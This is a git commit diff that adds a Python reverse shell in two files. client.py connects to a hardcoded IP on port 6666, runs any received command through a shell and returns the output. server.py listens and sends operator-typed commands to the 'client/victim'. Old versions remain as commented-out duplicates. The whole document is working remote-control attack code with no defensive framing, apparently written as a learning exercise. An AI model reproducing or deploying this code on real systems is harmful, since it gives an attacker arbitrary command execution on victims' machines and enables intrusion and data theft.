8fad5a30dc22fd4ec5d68090cf17f3f666bc508e
Ali Amin <alyr@Alis-MacBook-Pro.local>
2019-03-12 21:46:58 +0100

    Server and Client done

--- client.py
+++ client.py
@@ -1,28 +1,51 @@
+# import socket
+# import os
+# import subprocess
+
+
+# s = socket.socket()
+
+# host = "10.188.1.41"
+# port = 7777
+
+
+
+# s.connect((host,port))
+
+# while True:
+#     data = s.recv(1024)
+#     if data[:2].decode("utf-8") == "cd":
+#         os.chdir(data[3:].decode("utf-8"))
+
+#     if len(data)>0:
+#         cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr = subprocess.PIPE)
+#         output_byte = cmd.stdout.read() + cmd.stderr.read()
+#         output_str = str(output_byte,"utf-8")
+#         curr_dir = os.getcwd() + ">"
+#         s.send(str.encode(output_str + curr_dir))
+
+#         print(output_str)
+
 import socket
 import os
 import subprocess
 
-
 s = socket.socket()
+host = '10.188.1.41'
+port = 6666
 
-host = "10.188.1.41"
-port = 7777
-
-
-
-s.connect((host,port))
+s.connect((host, port))
 
 while True:
     data = s.recv(1024)
-    if data[:2].decode("utf-8") == "cd":
+    if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[3:].decode("utf-8"))
 
-    if len(data)>0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr = subprocess.PIPE)
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte,"utf-8")
-        curr_dir = os.getcwd() + ">"
-        s.send(str.encode(output_str + curr_dir))
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str + currentWD))
 
         print(output_str)
-
--- server.py
+++ server.py
@@ -1,74 +1,139 @@
 
+# import socket
+# import sys
+
+# # Create a socket ( connect two comp )
+# def create_socket():
+
+
+#     try:
+
+#         global host, port, s
+
+#         host = ""
+#         port = 7777
+
+#         s = socket.socket()
+
+#     except socket.error as msg:
+#         print("Socket creation error:" + str(msg))
+
+# #Biningthe socket and listening for connection
+
+# def bind_socket():
+
+#     try:
+#         global host
+#         global port
+#         global s
+
+#         print("Bindind Port " + str(port) )
+#         s.bind((host,port))
+#         s.listen(5)
+
+#     except socket.error as msg:
+#         print("Socket creation error:" + str(msg) +"\n"+ "retrying...")
+#         bind_socket()
+
+# # Establish conn with a client (socket must be listening)
+
+# def socket_accept():
+
+#     conn,address = s.accept()
+#     print("Connection has been established! " + "IP" + address[0] + "Port" + str(address[1]))
+
+#     send_commands(conn)
+
+#     conn.close()
+
+# #  Send commands
+
+# def send_commands(conn):
+
+#     while True:
+
+#         cmd = input()
+
+#         if cmd == 'quit':
+#             conn.close()
+#             s.close()
+#             sys.exit()
+
+#         if len(str.encode(cmd)) > 0:
+#             conn.send(str.encode(cmd))
+#             client_response = str(conn.recv(1024), "utf-8")
+#             print(client_response,)
+
+
+# def main():
+#     create_socket()
+#     bind_socket()
+#     socket_accept()
+    
+
+# main()
 import socket
 import sys
 
-# Create a socket ( connect two comp )
+
+# Create a Socket ( connect two computers)
 def create_socket():
-
-
-    try:
-
-        global host, port, s
-
-        host = ""
-        port = 7777
-
-        s = socket.socket()
-
-    except socket.error as msg:
-        print("Socket creation error:" + str(msg))
-
-#Biningthe socket and listening for connection
-
-def bind_socket():
-
     try:
         global host
         global port
         global s
+        host = ""
+        port = 6666
+        s = socket.socket()
 
-        print("Bindind Port " + str(port) )
-        s.bind((host,port))
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
+
+
+# Binding the socket and listening for connections
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+        print("Binding the Port: " + str(port))
+
+        s.bind((host, port))
         s.listen(5)
 
     except socket.error as msg:
-        print("Socket creation error:" + str(msg) +"\n"+ "retrying...")
-        bind_socket()
+        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
+    #     bind_socket()
+        
 
-# Establish conn with a client (socket must be listening)
+
+# Establish connection with a client (socket must be listening)
 
 def socket_accept():
-
-    conn,address = s.accept()
-    print("Connection has been established! " + "IP" + address[0] + "Port" + str(address[1]))
-
+    conn, address = s.accept()
+    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
     send_commands(conn)
-
     conn.close()
 
-#  Send commands
-
+# Send commands to client/victim or a friend
 def send_commands(conn):
-
     while True:
-
         cmd = input()
-
         if cmd == 'quit':
             conn.close()
             s.close()
             sys.exit()
-
         if len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response,)
+            client_response = str(conn.recv(1024),"utf-8")
+            print(client_response, end = "")
 
 
 def main():
     create_socket()
     bind_socket()
     socket_accept()
-    
+
 
 main()
+
